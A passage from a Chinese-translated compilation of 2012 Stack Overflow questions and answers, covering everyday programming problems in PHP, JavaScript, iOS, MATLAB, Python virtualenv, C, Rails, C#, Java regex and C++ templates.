*   使用调色板或相关颜色来显示相关项目，例如红色`lost`阴影代表 ，蓝色阴影代表`found`。此[示例](https://stackoverflow.com/a/8949913/230513)说明了`GanttRenderer`使用不同饱和度调色板的方法。此[示例](https://stackoverflow.com/a/9875534/230513)说明了`XYItemRenderer`使用不同色调的调色板的方法。自然，您需要覆盖`getSectionPaint()`而不是`getItemPaint().`

![图片](../Images/5d11bf1e6e94e42d8be1e2ff8689b21e.png)

# javascript - 使用 iOS 使用 Javascript 在网站上下载文件

> ID：13703048
> 
> 赞同：1
> 
> 时间：2012-12-04T12:36:06.213
> 
> 标签：javascript, ios, xcode, download

我正在尝试在[此站点](http://ishare.iask.sina.com.cn/download/explain.php?fileid=11024011)上以编程方式下载文件，我发现当您单击突出显示的下载按钮（“下载”）时，它会运行 Javascript：`document.getElementById('downLoad').action='/download.php?fileid=11024011';downishare('0');`

在我的 Mac 上，它运行良好并在我在 Safari 上运行时下载文件。但是当我使用

```
[webView stringByEvaluatingJavaScriptFromString:[NSString stringWithFormat:@"document.getElementById('downLoad').action='/download.php?fileid=11024011'"]]; 
```

它不返回任何东西。

有谁知道为什么以及如何获得下载网址？

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-18T19:26:30.563

您是否尝试过实现 webView 委托方法`shouldStartLoadWithRequest`来解析链接？

```
 - (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType
if ([[[request URL] absoluteString] hasPrefix:@"http://ishare.iask.sina.com.cn/download.php?fileid="])
//I believe this would download everything that has a link prefix of "http://ishare.iask.sina.com.cn/download.php?fileid="
//So you should create some sort of checker to make sure it only downloads the file they select
        // Determile cache file path
        NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
        NSString *filePath = [NSString stringWithFormat:@"%@/%@", [paths objectAtIndex:0],@"index.html"];   
        // Download and write to file
        NSURL *url = [NSURL URLWithString:[[request URL] absoluteString]];
        NSData *urlData = [NSData dataWithContentsOfURL:url];
        [urlData writeToFile:filePath atomically:YES];

        // Load file in UIWebView
        [webView loadRequest:[NSURLRequest requestWithURL:[NSURL fileURLWithPath:filePath]]];

        return NO;
    }
    else {
        return YES;
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:21:09.337

嗯……下载地址是这样的： http://ishare.iask.sina.com.cn/download.php?fileid= [11024011](http://ishare.iask.sina.com.cn/download.php?fileid=11024011)

您也可以使用 chrome 中的“网络”选项卡或 firefox 中的 firebug 进行检查。但是...当您尝试直接访问它时，它会重定向您。可能有一些服务器端的请求验证，比如引用 URL 或其他东西。

# caching - symfony2 http_cache 预热

> ID：13703049
> 
> 赞同：1
> 
> 时间：2012-12-04T12:36:08.273
> 
> 标签：caching, symfony

我想为 symfony2 http_cache 做一个缓存预热。
我也想把它集成到 cache:warmup symfony 命令中。

所以我做了一个新的缓存加热器，将它注册为服务等等。
到目前为止，这有效。

加热 http_cache 的最简单方法，恕我直言，只需通过 curl、buzz 或其他方式调用特定页面。

我将它放入`warmup()`方法中，但是在调用我的自定义加热器后，缓存目录中的 http_cache 目录以某种方式被清除。

如果我`exit;`在我的自定义取暖器中的 curl 调用之后放置一个，那么 http_cache 目录就在那里。

我在 services.xml 中尝试了一些优先级，但没有成功。

有任何想法吗？

# php - 在while循环中查询可以吗？

> ID：13703050
> 
> 赞同：1
> 
> 时间：2012-12-04T12:36:07.760
> 
> 标签：php, mysql

我在一个数据库中有两个表。我正在查询第一个表限制 10，然后循环结果。在 while 循环中，我再次使用第一个查询中的数据作为参数进行另一个查询。下面是一个脚本示例：

```
<?php

    $con = mysql_connect(host,username,password);
    mysql_select_db(game_server);

    //My first query
    $q1 = mysql_query('SELECT * FROM game_characters ORDER BY score DESC LIMIT 10');

    while($character = mysql_fetch_object($q1)){
    //My second query
        $q2 = mysql_query('SELECT * FROM game_board WHERE id="'.$character->id.'"');
        $player = mysql_fetch_object($q2);
    }
?> 
```

因此，如果我有 100 行的结果，那么第二个查询将执行 100 次。我知道这不好。我怎样才能让它变得更好。有没有办法在一个查询中完成所有事情？如果在 while 循环中有另一个查询，其中使用来自第二个查询的数据作为参数怎么办？

> PS：我正在做一个在线游戏的排名系统。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T12:41:43.247

如果您使用 JOIN，则可以在一个查询中完成。

```
SELECT * FROM game_board AS b 
    LEFT JOIN game_characters AS c ON b.id = c.id 
ORDER BY c.score DESC 
LIMIT 10 
```

您还可以使用嵌套查询

```
SELECT * FROM game_board AS b WHERE 
  id IN (SELECT id FROM game_characters AS c ORDER BY score DESC LIMIT 10) 
```

您也可以将所有 game_character.id 放入一个数组中，并使用

```
$sql = "SELECT * FROM game_board AS b WHERE b.id IN (" . implode(', ', $game_character_ids) . ")"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T12:40:05.213

为什么不使用`JOIN`？

`while`这样循环内就不会有查询：

```
$con = mysql_connect(host,username,password);
mysql_select_db(game_server);

//My first query
$q1 = mysql_query('
    SELECT * 
    FROM game_characters gc 
    LEFT JOIN game_board gb ON gc.id = gb.id
    ORDER BY score DESC 
    LIMIT 10
');

while($character = mysql_fetch_object($q1)){
    // do Your stuff here, no other query...

} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T12:40:50.617

这里更好的方法是收集连接字符串 str 中的所有 ID，格式为 'id1'、'id2'、'id3'，... 并使用： select * from game_board where id in (str)

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-12-04T12:41:30.300

如果您执行以下操作怎么办：

```
<?php

    $con = mysql_connect(host,username,password);
    mysql_select_db(game_server);

    //My first query
    $q1 = mysql_query('SELECT * FROM game_characters ORDER BY score DESC LIMIT 10');

    while($character = mysql_fetch_object($q1)){
    //My second query
        $characters .= " ' $character->id ' ,"
    }
    $q2 = mysql_query("SELECT * FROM game_board WHERE id in (substr($characters,0,strlen($characters - 2))");
    $player = mysql_fetch_object($q2);
?> 
```

# javascript - 如何使用javascript从树视图中选择“复选框”？

> ID：13703058
> 
> 赞同：1
> 
> 时间：2012-12-04T12:36:44.217
> 
> 标签：javascript, jquery, asp.net

我正在使用asp TreeView 控件。我想在客户端获取选定的“复选框”值。如何从 TreeView 中获取选定的值？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T12:38:26.183

假设你的树视图有 id`treeviewid`

```
$('#treeviewid input[type=checkbox]:checked').each(function(){
   alert($(this).val());    
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T12:49:16.680

我使用以下代码来确定所有选中的复选框：

```
$("input:checkbox").each(function () {
    if ($(this).is(':checked')) {
        //do something
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T12:43:54.557

我认为你应该使用 clientId

```
$('#<%=MyTreeView.ClientID%>').find(':checkbox:checked').each(function(){
   console.log($(this).val());    
}); 
```

# matlab - 在 Matlab 中计算协方差矩阵

> ID：13703063
> 
> 赞同：6
> 
> 时间：2012-12-04T12:37:03.547
> 
> 标签：matlab, covariance

我正在 MATLAB 中实现 PCA 算法。我看到了两种不同的计算协方差矩阵的方法：

```
C = sampleMat.' * sampleMat ./ nSamples; 
```

和

```
C = cov(data); 
```

这两种方法有什么区别？

**PS 1：**当我使用时`cov(data)`是不必要的：

```
meanSample = mean(data,1);
data = data - repmat(data, nSamples, 1); 
```

**PS 2：**

一开始我应该使用`nSamples`or`nSamples - 1`吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-04T12:39:23.600

简而言之：`cov`主要只是为裸公式增加了便利性。

如果你输入

```
edit cov 
```

你会看到很多东西，这些行一直在底部：

```
xc = bsxfun(@minus,x,sum(x,1)/m);  % Remove mean    
if flag
    xy = (xc' * xc) / m;
else
    xy = (xc' * xc) / (m-1);  % DEFAULT 
end 
```

这与您的第一行基本相同，除了减去列均值。

阅读有关示例协方差[的 wiki](http://en.wikipedia.org/wiki/Covariance#Calculating_the_sample_covariance)，以了解为什么默认路径中有减一。

但是请注意，您的第一行使用普通转置 ( `.'`)，而`cov`-version 使用共轭转置 ( `'`)。这将使`cov`复值数据的上下文中的输出不同。

另请注意，这`cov`是对非内置函数的函数调用。`cov`这意味着在循环中使用时会有（可能很严重）性能损失；Matlab 的 JIT 编译器无法加速非内置函数。

# php - 如何将参数传递给专门针对 register_shutdown_function 的可调用方法？

> ID：13703065
> 
> 赞同：5
> 
> 时间：2012-12-04T12:37:04.857
> 
> 标签：php, oop, arguments, callable

我有方法，在这个方法中可能会发生致命错误，为了捕捉这个错误我做了这个

```
class a {

    function shutDownFunction() { 
        $error = error_get_last();
        if ($error['type'] == 1) {
            echo "this is fatal error";
        } 
    }

    function terribleFunction () {
        register_shutdown_function(array($this,'shutdownFunction'));

        // here is code, wich may causes fatal error

    }

} 
```

好的，这明白了，但我需要从`terribleFunction`to传递参数`shutDownFunction`。这个怎么做？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-04T12:40:20.193

首先，您需要指定`shutDownFunction`应该接受一个参数。

`function shutDownFunction($var)`

然后你可以`register_shutdown_function`这样打电话

`register_shutdown_function(array($this, 'shutdownFunction'), $myVar);`

文档在[这里](http://php.net/manual/en/function.register-shutdown-function.php)，评论中有示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T12:41:31.610

您可以查看[register_shutdown_function](http://php.net/register_shutdown_function)文档。还有第二个可选参数`parameter`传递给您的`shutDownFunction()`. 这个函数你可以这样定义：

```
function shutDownFunction($args) {
   //do whatever you want with $args
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T12:40:58.180

您应该只使用一个 register_shutdown_function 而不是仅在方法内部使用它来捕获该方法中的错误。对于错误捕获，请使用 try、catch、finally 块

请参阅： http: [//php.net/manual/en/language.exceptions.php](http://php.net/manual/en/language.exceptions.php)

# android - android上的javascript地理定位在离线模式下不起作用

> ID：13703069
> 
> 赞同：3
> 
> 时间：2012-12-04T12:37:15.897
> 
> 标签：android, cordova, geolocation

您好我想知道是否可以在没有互联网连接的情况下捕获地理位置。假设我没有连接到网络，但我有我的 Gps，是吗

```
navigator.geolocation.getCurrentPosition(successCallback, errorCallback,
  {
    enableHighAccuracy : true,
    timeout : 10000, // 10s
    maximumAge : 0
  } 
```

在这种情况下工作

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-08T10:59:26.580

当我开发我的 phonegap 应用程序（在 android 上）时，我发现使用 enableHighAccuracy 并不总是返回准确的位置，有时操作系统会返回大约 100 米精度的低精度位置，我假设使用网络三角测量或互联网连接以确定位置。

此外，如果您在应用程序运行时丢失 GPS 定位，操作系统有时会返回不准确的位置。AFAIK 无法判断返回到successCallback() 的位置是通过哪种方法获得的，但我通过检查返回到successCallback() 的响应对象中的精度值推断出这一点：我设置了50 米的最低要求精度；如果返回的位置不如这个准确，我会忽略它们。

试试这个测试用例，看看您的设备返回的准确度如何。由于 navigator.geolocation.getCurrentPosition() 只返回一次您的位置，所以我使用的是 navigator.geolocation.watchPosition()。希望这可以帮助！

```
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Geolocation test</title>

<script type="text/javascript" src="phonegap.js"></script>
<script type="text/javascript" src ="jquery-1.7.1.min.js"></script>

<script type="text/javascript" >    
    $(document).on("deviceready", function() {
        var minimumAccuracy = 50; // Minimum accuracy in metres to accept as a reliable position

        function successCallback(position){
            $('#error').html('');
            $('#lat').html(position.coords.latitude);
            $('#lon').html(position.coords.longitude);
            $('#accuracy').html(position.coords.accuracy);
            $('#accurate').html(position.coords.accuracy > minimumAccuracy ? "true" : "false");

        }

        function errorCallback(error){
            $('#lat').html(''); $('#lon').html(''); $('#accuracy').html(''); $('#accurate').html('');
            $('#error').html("Error while retrieving current position. <br/>Error code: " + error.code + "<br/>Message: " + error.message);
        }

        navigator.geolocation.watchPosition(successCallback, errorCallback, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0

        });
    });

</script>
</head>
<body>
<p>Latitude: <span id="lat"></span></p>
<p>Longitude: <span id="lon"></span></p>
<p>Accuracy: <span id="accuracy"></span></p>
<p>Accurate?: <span id="accurate"></span></p>
<hr/>
<p>Error: <span id="error"></span></p>
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-08-29T08:21:47.480

对于 Android 应用程序，您可以使用可从[http://www.offlinegeolocation.com](http://www.offlinegeolocation.com)下载的 Android 库- 它是免费的，但非常大（全球 240 MB，仅限英国 10 Mb）。它使用已知的蜂窝塔位置，并将其与检测到的附近蜂窝塔进行比较。它不如 GPS 或在线地理定位准确，但可能适合您作为故障转移的需求。

为了在 Phonegap 中使用它，需要将其转换为 Phonegap 插件。这里有一个很好的教程：http: [//devgirl.org/2013/07/17/tutorial-how-to-write-a-phonegap-plugin-for-android/](http://devgirl.org/2013/07/17/tutorial-how-to-write-a-phonegap-plugin-for-android/)

# python - 对 virtualenv 使用单个站点包（作为例外）

> ID：13703074
> 
> 赞同：2
> 
> 时间：2012-12-04T12:37:23.027
> 
> 标签：python, lxml, virtualenv

在 virtualenv 中，如何忽略`no-site-packages`单个包的规则？

一些背景知识：我使用 virtualenv 进行部署，但自从我使用`lxml`. 每次我为新的 virtualenv 重新安装时，编译它最多需要 15 分钟。`lxml`我可以为全局站点包做某种例外并使用它吗？除了将其复制到新的 virtualenv 中之外，还有什么更安全/更可靠的选择吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-05T08:56:24.747

简短的回答：不，但你可以做其他事情来解决同样的问题。

该`--no-site-packages`选项（现在是默认选项，除非您指定`--system-site-packages`）控制是否将某些目录添加到[`sys.path`](http://docs.python.org/2/library/sys.html#sys.path). 一个给定的目录要么在要么不在，你不能只区分该目录中的一个包。

但是，您可以在虚拟环境的`site-packages`目录中创建指向包的符号链接。在我的系统上：

```
ln -s /usr/lib/python2.7/site-packages/lxml ./env/lib/python2.7/site-packages 
```

或更一般地说（使用系统的python，而不是环境的）：

```
ln -s $(python -c 'import lxml, os.path; print(os.path.dirname(lxml.__file__)') ./env/lib/python2.7/site-packages 
```

如果您使用的系统不支持符号链接，则复制也应该可以工作，但在更新系统范围的 lxml 时会更加脆弱。

# c - mmap 需要 shm_open 吗？

> ID：13703079
> 
> 赞同：3
> 
> 时间：2012-12-04T12:37:44.873
> 
> 标签：c, linux

我有一种情况，我需要执行文件 IO，但我是沙盒。因此，我将 shm_open 与 mmap 一起使用，以返回一个文件描述符，我可以在内存中愉快地读取/写入/写入。

我遇到的问题是我要移植到的平台没有 shm_open。mmap 是否需要 arg 5 作为“文件描述符”？还是有其他方法可以在没有 shm_open 的情况下使用 mmap？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:42:47.090

您可以使用该`MAP_ANONYMOUS`标志来映射一块内存。这与调用基本相同`malloc`，您写入的任何数据都不会保存，因为它们都在内存中。

# ruby-on-rails - 调用控制器的动作但不跳转到 ERB 视图

> ID：13703080
> 
> 赞同：0
> 
> 时间：2012-12-04T12:37:50.993
> 
> 标签：ruby-on-rails, view, action

谢谢你的时间！

我得到路线`routes.rb`：

```
get "loadreport/test"
post "loadreport/update" 
```

控制器中的`test`函数`loadreport`是一个空函数：

```
def test
end 
```

test.html.erb 包含：

```
<form action="/loadreport/update?method=post" class="button_to" method="post">
  <div>
    <input type="submit" value="Update" />
    <textarea cols="30" id="post_body" name="comments" rows="5" maxlength=200>

    </textarea>
  </div>
</form> 
```

该`update`函数将更新数据库：

```
def update
  some_database.update(params[:comments])
end 
```

现在，当我单击`Update button`in 时`test.html.erb`，它会调用`/loadreport/update`并跳转到`update.html.erb`. 由于`update.html.erb`不存在，服务器会给我如下错误：`Template is missing ... blah ...`

我想要实现的是：当我点击`Update button`in 时`test.html.erb`，它会简单地调用`/loadreport/update`更新数据库，然后弹出一个消息框，上面写着“更新成功！”，而不是跳转到另一个页面。

如何更改我的代码以实现这一目标？谁能给我一些关于这个主题的想法或一些链接。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:49:34.823

您可以发布 Ajax 帖子并获得回报并显示警报。试试 jQuery。

或尝试：

```
def update
   some_database.update(params[:comments])
   redirect_to :test
end 
```

这将重定向到上一页。

# jquery - 引导程序和 JQuery 响应滑块之间的冲突

> ID：13703082
> 
> 赞同：0
> 
> 时间：2012-12-04T12:37:52.733
> 
> 标签：jquery, jslider

布局中的滑块有问题。
我有一个滑块，它正在工作，但图像被压缩和扭曲，而不是像原始滑块那样移动。

我收到以下错误：

```
TypeError: $(window).on is not a function
$(window).on( 'smartresize.eislideshow', function( event ) { 
```

我该如何解决。我对这个js不熟悉。

*   [我的网站](http://b.pusku.com/)
*   [原始滑块](http://tympanus.net/codrops/2011/11/21/elastic-image-slideshow-with-thumbnail-preview/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T12:43:07.763

您在不支持该`on()`方法的页面中使用 jQuery 1.6.4。这仅在 1.7 版[http://api.jquery.com/on/中引入](http://api.jquery.com/on/)

**编辑**

除了您包含的行之外，还有两个加载旧版本的脚本。这些是参考线。他们一定是从您的 wordpress 模板中提取出来的。

```
<script type='text/javascript' src='http://b.pusku.com/wp-includes/js/jquery/jquery.js?ver=1.7.2'></script>

<script type='text/javascript' src='http://b.pusku.com/wp-content/themes/wpbootstrap/bootstrap/js/jquery.js?ver=3.4.2'></script> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T12:43:19.000

您的网站头部包含的不是一个，不是两个，而是 3 个不同版本的 jQuery！！！！（1.8.0、1.7.2，最后是 1.6.4）。最后一个覆盖前面的 2，并且 1.6.4 不包括 .on() 方法。

# c# - 阻止富文本框中的图像

> ID：13703083
> 
> 赞同：3
> 
> 时间：2012-12-04T12:37:56.870
> 
> 标签：c#, winforms, richtextbox

我正在开发一个使用大量 RichTextBoxes 的 C# winForms 应用程序。我发现如果我复制一张图片并将其粘贴到任何 RichTextBox 中，该图片就会被发布。有没有办法不允许将图像粘贴到 RichTextBox 中。换句话说，只允许键盘字符。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2017-02-10T20:31:22.513

上面的答案的问题是它在混合内容的情况下不起作用。例如，如果您突出显示电子表格中的几行并粘贴到 Richtextbox 中，您最终会得到的不仅仅是原始文本。我认为更好的解决方案如下：

```
 private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.Control && e.KeyCode == Keys.V)
        {
            if (Clipboard.GetData("Text") != null)
                Clipboard.SetText((string)Clipboard.GetData("Text"), TextDataFormat.Text);
            else
                e.Handled = true;
        }            
    } 
```

编辑：下面的方法是由 MrCC 共享的，比我上面的方法更直接/更好。

```
 private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
    {
        if (e.Control && e.KeyCode == Keys.V)
        {
            if (Clipboard.ContainsText())
                richTextBox1.Paste(DataFormats.GetFormat(DataFormats.Text));
            e.Handled = true;
        }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-05T06:52:51.513

我能够回答我的问题。这是以防其他人正在寻找它。

```
private void InputExpressionRchTxt_KeyDown(object sender, KeyEventArgs e)
{
    bool ctrlV = e.Modifiers == Keys.Control && e.KeyCode == Keys.V;
    bool shiftIns = e.Modifiers == Keys.Shift && e.KeyCode == Keys.Insert;
    if (ctrlV || shiftIns)
        if (Clipboard.ContainsImage())
            e.Handled = true;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T12:45:06.810

也许，您可以捕捉粘贴事件并检查复制到 RichTextBox 的对象。如果是图像，只需将其删除。

# java - 从文本文件中删除换行符前的一个或多个空格

> ID：13703095
> 
> 赞同：0
> 
> 时间：2012-12-04T12:38:40.247
> 
> 标签：java, regex, newline

我有一个包含电子邮件标题及其值的文本文件。如下所示：

```
X-Originating-IP: [141.12.67.171]
X-EIP: [WrrdRE5IHzynFRch2UnizIKJ909XPTq5]
X-Originating-Email: [reva.reva.reva@hotmail.com]
Message-ID: <SNT139-W588104AB227AA9D1E443ABCF540@phx.gbl>
Content-Type: multipart/mixed;
boundary="_ee82adcf-0995-439f-a6dc-4386dadf9660_"
From: Reva Patil <reva.reva.reva@hotmail.com>  
To: <mueller.reva@yahoo.de>
Subject: Hotmail
Date: Wed, 21 Nov 2012 12:34:46 +0000
Importance: Normal
MIME-Version: 1.0
X-OriginalArrivalTime: 21 Nov 2012 12:34:47.0075 (UTC) FILETIME=[976F7F30:01CDC7E4] 
```

我注意到在从“From:”开始的行中（使用 winmerge 文件比较工具），换行符之前有空格。我想删除它。实际上，我想删除文件中每个换行符之前的所有空格。我已经在这里完成了发布的问题：[在java中的新行之前删除空格](https://stackoverflow.com/questions/5488527/removing-space-before-new-line-in-java) 但不幸的是这对我没有帮助。

我将不胜感激在 java 中执行此操作的任何建议。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T12:48:38.903

采用`Guava`

读取文件：

```
File file = new File(getClass().getResource("/test.txt").getFile());
List<String> lines = null;
try {
    lines = Files.readLines(file, Charsets.UTF_8);
} catch (IOException e) {
    e.printStackTrace();
} 
```

`trim()`每一行。

再写那些行

使用：[文件#write](http://docs.guava-libraries.googlecode.com/git/javadoc/com/google/common/io/Files.html#write%28java.lang.CharSequence,%20java.io.File,%20java.nio.charset.Charset%29)

编辑：

```
 File file = new File(getClass().getResource("/test.txt").getFile());
    List<String> lines = null;
    try {
        lines = Files.readLines(file, Charsets.UTF_8);
    } catch (IOException e) {
        e.printStackTrace();
    }

    List<String> trimmedLines = new ArrayList<String>(lines.size());

    File to; /// outputfile
    Charset charSet = Charset.defaultCharset();
    for (String line : lines) {
        Files.write(line.trim(), to, charSet);
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T12:52:22.587

假设您将文件作为字符串，请执行此操作

```
String trimmed = contents.replaceAll("(?m)\\s+(?=$)", ""); 
```

解释：

*   `(?m)`打开“换行符前后的插入符号和美元匹配”开关
*   `\s+`表示“一个或多个空白字符
*   `(?=$)`表示下一个字符（未使用）是行尾字符

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-09T09:56:49.640

谢谢大家的回复。

最后我可以找到从字符串中删除所有空格（包括非中断空格）的正则表达式。

```
str= str.replaceAll("[\\s\\u00A0]+",""); 
```

# objective-c - UIButton在滚动时没有响应

> ID：13703101
> 
> 赞同：1
> 
> 时间：2012-12-04T12:39:07.900
> 
> 标签：objective-c, ios, uiscrollview

我有一个 UIButton 添加到 UIScrollView 的子视图。

只要用户不滚动，该按钮就可以正常工作。如果用户单击按钮时 UIScrollView 仍在滚动，它只会停止滚动（就像单击了一行一样）。

有人知道怎么修这个东西吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-08T21:09:44.737

首先，确保这确实是您想要的行为 - iOS 用户习惯于滚动视图并通过点击来停止它们而不触发按钮按下。非标准行为（即使你认为它*比*标准行为更好）可能会让习惯于在其他 iOS 应用程序中工作的用户感到困惑——它可能会违反他们的[心理模型](http://www.useit.com/alertbox/mental-models.html)。好的，注意事项结束。

那么你如何解决这个问题？`UIScrollView`延迟发送触摸事件，直到它知道这些触摸是否是滚动事件。您的问题是用户点击*是*移动时的滚动事件`UIScrollView`。两种可能的解决方案：

1.  停止`UIScrollView`延迟它获得的任何触摸事件。您可以将任何滚动视图设置`delaysContentTouches`为`NO`，这将停止延迟操作，并应允许在滚动时点击您的按钮。[`UIScrollView`你可以在类文档](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIScrollView_Class/Reference/UIScrollView.html)中阅读它。您还需要阅读`canCancelContentTouches`那里的内容。

2.  子类化`UIScrollView`以添加您自己的关于触摸事件应该去哪里的逻辑。[这是一篇讨论如何执行此操作的博客文章](http://mobiledevelopertips.com/user-interface/detect-single-tap-in-uiscrollview.html)。

# c# - ASP.Net MVC 中不正确模型的编译时间错误

> ID：13703105
> 
> 赞同：3
> 
> 时间：2012-12-04T12:39:19.197
> 
> 标签：c#, asp.net, asp.net-mvc, razor

有什么方法可以让强类型视图出现编译时错误。假设我在文件夹中有一个视图，其中`/Views/Home/Index.cshtml`包含以下代码和强类型模型：

```
@model CSTemplate.Models.Home.HomeIndexModel

@{
    ViewBag.Title = "Index";
}

<h2>Index</h2> 
```

然后位于的控制器`/Controllers/HomeController.cs`将返回以下代码。

```
public class HomeController : Controller
    {
        //
        // GET: /Home/

        public ActionResult Index()
        {
            List<string> s = new List<string>();
            return View(s);
        }

    } 
```

如您所见，由于 View() 接受对象作为模型，编译器不会抱怨模型无效，而是会输出运行时错误，即：

```
Server Error in '/' Application.

The model item passed into the dictionary is of type 'System.Collections.Generic.List`1[System.String]', but this dictionary requires a model item of type 'CSTemplate.Models.Home.HomeIndexModel'. 
```

在这种模型类型不匹配的情况下，有什么方法可以让我得到编译时错误而不是运行时错误，或者有什么解决方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-05T12:57:39.847

从我们在这个问题中的讨论来看，似乎没有针对这种情况的建议解决方法。由于 View 将 type 的模型作为参数`object`，因此如果您错误地传递了与 View 的严格类型模型不同类型的模型，编译器将不会抱怨。遗憾的是，如果您需要更改视图的严格类型模型的类型，编译器不会通知您将此类先前不一致的模型传递给视图，而是仅在运行时通知此类错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-20T22:44:05.870

我已经上传了一个 nuget 包来解决这个问题，它会生成真正强命名的视图。
在这里检查

[https://www.nuget.org/packages/StronglyTypedViews/](https://www.nuget.org/packages/StronglyTypedViews/)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-12-04T12:42:27.113

`return View(s);`应该返回类型

```
CSTemplate.Models.Home.HomeIndexModel //this is the type model expecting 
```

不是

```
List<string> //this is the type you are returning to the model 
```

# c++ - c++模板类对象兼容

> ID：13703112
> 
> 赞同：0
> 
> 时间：2012-12-04T12:39:29.963
> 
> 标签：c++

我有一个模板类

```
template<int N>
class xyz{
some code ....
}; 
```

如果我不在类中使用 N，那么无论模板值如何，此类的所有对象都应该兼容。但它不是。

例如，如果我说`xyz<20> a`then `xyz<30> b(a)`，编译器会报错。

为什么会这样？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T12:43:26.263

因为它们是不同的类型。即使对于这个空的类模板

```
template <int N> struct Foo {}; 
```

`Foo<1>`是不同的类型`Foo<2>`。当使用模板参数实例化这样的模板时，它会创建一个不同的类，而不管该模板参数是否在类的代码中使用。类模板是根据一些（模板）参数构建类的配方（模板）。

现在，如果您希望能够`Foo`从另一个实例构造一个实例，那么您可以添加一个隐式转换构造函数：

```
template <int N> 
struct Foo 
{
  template <int M> Foo(const Foo<M>& rhs) {}
}; 
```

然后你可以在一个和另一个之间隐式转换：

```
Foo<42> a;
Foo<1> b (a);
Foo<99> c;
c = b; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T12:51:58.017

每次使用不同的值时`N`，编译器都会创建一个新的类定义。使用模板值或不改变什么。

函数参数也是一样的：

```
int foo(void) {          // foo is of type `int (*)()`
    return 1;
}

int bar(int not_used) {  // bar is of type `int (*)(int)`
    return 1;
} 
```

`bar`不要使用参数，但它的签名与`foo`.

就像您不能将`foo`or分配`bar`给同一个变量（因为它们的类型不同），您不能混合`xyz<0>`和的实例`xyz<1>`。

如果你想这样做，你应该考虑使用经典继承。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T12:59:51.897

模板类型等效规则明确写在标准中（第 14.4 段）。一条规则规定：

> 两个模板 ID 引用同一个类或函数，如果
> 
> *   它们对应的整数或枚举类型的非类型模板参数具有相同的值

因此，不同的数字模板参数将产生不同的类型，无论它们是否实际使用。在后一种情况下，您可能希望使用模板复制构造函数：

```
template<int N>
class xyz{

  template<int M>
  xyz::xyz(const xyz<M>&);

}; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T12:55:53.433

当您说兼容时，我假设您的意思是“可复制并相互分配”。

您将需要定义复制构造函数和赋值运算符来处理用任意 int 值实例化的类。

```
template<int N>
class Foo {
public:
  template<int NO>
  Foo(const Foo<NO>& other) {
    // do stuff
  }

  template<int NO>
  Foo& operator=(const Foo<NO>& other) {
    // do stuff
    return *this;
  }
}; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T12:47:59.123

How do you want compiler to prove that?

Consider:

```
template<int N>
class xyz{
void foo () {external_function (N);}
}; 
```

Do you suggest compiler to go and check what `external_function` does?

Besides having compiler produce compatible types on the grdounds of N not being used would have been a maintanence nightmare.

# ruby - Ruby 一步更新属性和保存实例

> ID：13703113
> 
> 赞同：1
> 
> 时间：2012-12-04T12:39:30.960
> 
> 标签：ruby

Ruby 是否提供增强版的赋值运算符（“ `=`”），允许您将这两行合并为一条？

```
foo.bar = "woof"
foo.save 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-04T12:42:41.950

*Ruby*没有，但我假设你在 Rails 中这样做，在这种情况下你可以这样做

```
foo.update_attributes bar: "woof" 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-04T12:45:10.417

ActiveRecord 允许您更新单个属性：

```
foo.update_attribute :bar, 'woof' 
```

或一次多个属性：

```
foo.update_attributes bar: 'woof' 
```

请注意，后一种表示法将针对批量分配权限执行安全检查。

# iphone - 如何将具有两个以上参数的参数化方法调用到选择器

> ID：13703115
> 
> 赞同：0
> 
> 时间：2012-12-04T12:39:33.747
> 
> 标签：iphone, objective-c, ios, xcode, selector

